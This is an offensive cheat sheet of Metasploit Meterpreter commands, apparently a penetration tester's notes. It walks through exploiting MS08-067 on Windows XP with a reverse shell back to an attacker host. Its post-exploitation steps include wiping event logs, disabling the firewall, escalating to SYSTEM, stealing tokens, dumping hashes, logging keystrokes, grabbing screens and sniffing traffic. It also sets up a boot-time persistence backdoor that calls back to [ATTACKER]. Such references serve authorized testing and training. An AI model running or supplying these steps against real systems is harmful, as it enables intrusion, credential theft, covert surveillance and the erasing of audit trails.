Metasploit Meterpreter
======================

#### Usage

	$ msfconsole    # starts metasploit
	$ msfupdate     # updates metasploit
	run + two tabs  #lists all meterpreter scripts

#### Getting Meterpreter Shell

netapi exploit
works almost all of the time with XP

	msf> use exploit/windows/smb/ms08_067_netapi 
	msf> set RHOST [TARGET]
	msf> set PAYLOAD windows/meterpreter/reverse_tcp    
		# victim will connect back to the console to establish session
	msf> set LHOST [LOCALHOST]
	msf> exploit


#### Post Exploits

	clearev                     # wipes all system and security logs
	execute -f cmd.exe -c -H    # creates cmd session and channelize; will keep prompt hidden
	getdesktop                  # shows current desktop sessions
	getuid
	getpid
	getsystem -h                # privilege escalation, 0 will attempt every technique, 1 and 2 usually work
	idletime
	ipconfig
	list_tokens -u              # lists user tokens by name
	load incognito
	migrate 1908                # migrates into process 1908
	netsh firewall show opmode  # shows if firewall is up or not
	netsh firewall set opmode mode=DISABLE	# turns firewall off
	ps
	rev2self                    # reverts back to the user you exploited as
	route
	run checkvm   
	run get_env
	run get_application_list
	run scraper                 # access hashes > cd .msf4/logs/scripts/scraper/
	run winenum                 # access dump  > cd .msf4/logs/scripts/winenum/
	steal_token 3280            # process to steal a token from
	sysinfo
	tasklist                    # to view a list of processes


#### Keystroke Logger

	getuid        # should say SYSTEM
	getdesktop    # should say Session 0...\Default
	ps            # find explorer.exe (in this case 1744)
	migrate 1744
	getpid        # verify that you are running as 1744
	getdesktop    # should now say Session 0\WinSta0\Default
	keyscan_start
	keyscan_dump  # will print the text to the screen
	keyscan_stop


#### Persistence

	run persistence -h    # shows options
	run persistence -A -L c:\\ -X -i 10 -p 443 -r [ATTACKER]
	
	# -A when the persistence backdoor connects back there will be something waiting to connect
	# -L location of payload in target host 
	# c:\\ the location parameter
	# -X automatically start when the system boots up
	# -i number of seconds to wait before each connection attempt 
	# 10 the parameter of time to wait
	# -p 443 port that metasploit is listening
	# -r ip address that the attacker machine is running on

After running take note of resource file and its location to delete it afterwards

After connection:

	background                                        # keeps process running in background
	sessions -l                                       # lists the backdoor sessions
	resource /root/.msf4/logs/persistence[path].rc    # removes the backdoor vb script

#### Screen Capture

	ps            # find process under username you want to exploit
	migrate 3708 
	use espia
	screengrab

#### Sniffer

	load sniffer
	sniffer_interfaces       # look for interface that shows usable:True
	sniffer_start 1 1024     # sniffing with adapter 1 and packet buffer of 1024
	sniffer_stats 1          # looks at traffic 
	sniffer_dump 1 dump.pcap
	sniffer_stop 1
	wireshark dump.pcap